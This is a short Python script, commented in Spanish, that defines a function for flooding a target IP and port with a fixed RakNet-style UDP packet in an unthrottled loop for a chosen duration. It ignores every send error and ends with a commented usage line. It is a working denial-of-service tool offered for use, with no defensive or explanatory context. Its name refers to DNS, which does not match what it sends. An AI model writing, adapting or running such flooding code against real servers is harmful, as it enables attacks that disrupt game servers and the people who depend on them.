import socket
import time

def raknet_dnsflood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    # Paquete tipo RakNet simple
    raknet_packet = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

    while time.time() < end_time:
        try:
            sock.sendto(raknet_packet, (ip, port))
        except Exception:
            pass  # Ignorar errores
    sock.close()

# Ejemplo de uso:
# raknet_dnsflood('IP', PORT, TIEMPO)
